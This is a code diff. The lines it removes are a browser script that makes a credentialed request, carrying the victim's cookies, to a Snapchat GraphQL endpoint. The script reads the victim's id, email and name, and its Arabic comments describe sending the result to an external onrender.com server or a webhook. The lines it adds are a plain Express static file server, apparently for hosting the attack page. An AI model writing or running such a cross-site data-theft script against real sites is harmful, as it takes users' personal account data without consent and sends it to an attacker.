@@ -1,26 +1,14 @@
-<script>
-fetch("https://gcp.api.snapchat.com/gfg/?op=FetchUserInfoQuery", {
-  method: "POST",
-  credentials: "include", // نرسل كوكي الضحية
-  headers: {
-    "Content-Type": "application/json"
-  },
-  body: JSON.stringify({
-    "operationName": "FetchUserInfoQuery",
-    "variables": {},
-    "query": "query FetchUserInfoQuery { me { id email name __typename } }"
-  })
-})
-.then(res => res.text())
-.then(data => {
-  // تطبع البيانات في صفحة المهاجم أو ترسلها لسيرفر ثاني
-  document.body.innerHTML = "<pre>" + data + "</pre>";
+// index.js
+const express = require("express");
+const app = express();
+const path = require("path");
 
-  // أو ترسلها لبريدك/Discord/Webhook
-  fetch("https://ssrf-52rk.onrender.com", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ snapchat_response: data })
-  });
+app.use(express.static(path.join(__dirname)));
+
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "index.html"));
 });
-</script>
+
+app.listen(10000, () => {
+  console.log("🔥 Server running at http://localhost:10000");
+});
